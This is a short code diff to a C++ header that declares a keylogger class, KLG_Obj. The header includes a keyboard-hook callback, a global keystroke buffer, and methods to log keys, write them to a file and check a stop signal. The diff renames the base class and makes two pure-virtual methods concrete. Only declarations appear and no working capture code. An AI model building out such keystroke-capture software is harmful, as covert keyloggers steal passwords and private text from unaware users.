@@ -1,6 +1,6 @@
 #pragma once
 
-#include  "DataTransferObj.h"
+#include  "DataObj.h"
 #include <string>
 #include <vector>
 #include <memory>
@@ -9,19 +9,20 @@
 
 std::vector<int> keylog;
 
-class KLG_Obj: public DataTransferObj
+class KLG_Obj: public DataObj
 {
 
 public:
 	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 	// Convert data object to string type
-	std::string toString() = 0;
+	std::string toString();
 
 	// Convert data object to a file
-	std::string toFile(std::string filename) = 0;
+	std::string toFile(std::string filename);
 
 	std::string keylogger();
+
 	bool checkStopSignal();
 
 };
